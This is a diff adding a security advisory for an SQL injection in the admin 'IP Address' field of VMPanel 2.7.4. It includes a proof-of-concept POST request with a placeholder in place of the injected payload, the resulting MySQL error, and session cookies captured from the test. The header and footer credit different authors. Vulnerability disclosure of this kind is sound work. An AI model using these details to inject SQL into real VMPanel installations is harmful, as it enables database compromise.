@@ -1,0 +1,85 @@
+=====================================================
+[#] Exploit Title :  VMPanel 2.7.4 - SQL Injection Web Vulnerability
+[#] Author : Esmaeil Rahimian
+[#] Date Discovered : 2016-12-07
+[#] Affected Product(s): VMPanel v2.7.4 - Content Management System
+[#] Exploitation Technique: Remote
+[#] Severity Level: Medium
+[#] Tested OS : Windows 10
+=====================================================
+
+
+[#] Product & Service Introduction:
+===================================
+VMPanel is a powerful web based VMware Esx/Esxi Control Panel + WHMCS addon
+with VMPanel you can create or remove virtual machines remotely without the need to access vsphere Client aslo you can
+Power Off,Power On, reset,virtual machine through the panel and module for WHMCS
+
+(Copy of the Vendor Homepage: http://www.cybervm.com/ )
+
+
+[#] Technical Details & Description:
+====================================
+A remote sql injection web vulnerability has been discovered in the official VMPanel v2.7.4 web-application (cms).
+The web vulnerability allows remote attackers to execute own malicious sql commands to compromise the web-application or dbms.
+
+The sql-injection web vulnerability is located in the `IP Address` entry name, that is located in the pannel administration. 
+Remote attackers are able to run clean sql commands, the vulnerability attack vector is application-side and 
+the injection request method is POST.
+
+Request Method(s):
+              [+] POST
+
+Vulnerable Module(s):
+              [+] (Input)
+
+Vulnerable Parameter(s):
+              [+] IP Address
+
+
+[#] Proof of Concept (PoC):
+===========================
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+
+--- PoC Session Logs [POST]---
+Status: 200 [OK]
+Host: localhost:2023
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:2023/sesswuzs6ugfaxa7ufii/index.php?act=addserver
+Cookie: head_ippool=2; head_storage=2; head_servers=2; ssupp.vid=UMvYqzxZJxPU8VfwJ23WTpt5PWxnqZmYHQ45341807122016; ssupp.geoloc=%7B%22ipAddress%22%3A%22176.156.184.208%22%2C%22countryCode%22%3A%22FR%22%2C%22country%22%3A%22France%22%2C%22region%22%3Anull%2C%22city%22%3Anull%7D; WHMCS4tXQk3bQ4YHY=l8580de1p2dm64gtevt7jj15s7; SIMCookies001_sid=yd0da41j3abie5zhb8jwjsd5nk6c07ce
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 141
+
+
+POST Method: server_name=&ip=[INJECTION SQL HERE]&pass=&mikip=&mikuser=&mikpass=&bw=&addserver=Add+Server
+
+
+--- PoC Error Logs ---
+SELECT * FROM `servers` WHERE `server_ip` = ''"/>>:22'
+MySQL Error No : 1064
+MySQL Error : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"/>>:22'' at line 1
+
+
+[#] Disclaimer:
+===============
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
+The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
+
+
+Domain:     www.zwx.fr
+Contact:    msk4@live.fr  
+Social:     twitter.com/XSSed.fr
+Feeds:      www.zwx.fr/feed/
+Advisory:   www.vulnerability-lab.com/show.php?user=ZwX
+            packetstormsecurity.com/files/author/12026/
+            cxsecurity.com/search/author/DESC/AND/FIND/0/10/ZwX/
+            0day.today/author/27461
+
+
+                             Copyright (c) 2016 | ZwX - Security Researcher (Software & web application)
